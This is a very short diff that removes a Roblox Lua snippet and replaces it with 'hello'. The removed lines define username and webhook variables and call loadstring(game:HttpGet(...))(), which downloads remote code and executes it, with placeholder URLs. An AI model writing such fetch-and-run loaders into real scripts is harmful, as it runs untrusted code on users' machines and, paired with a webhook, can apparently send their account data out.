@@ -1,7 +1,1 @@
-
-Username = "hi"
-Username2 = "hi"
-Webhook = "https.com"
-
-loadstring(game:HttpGet("https.com"))()
-      
+hello
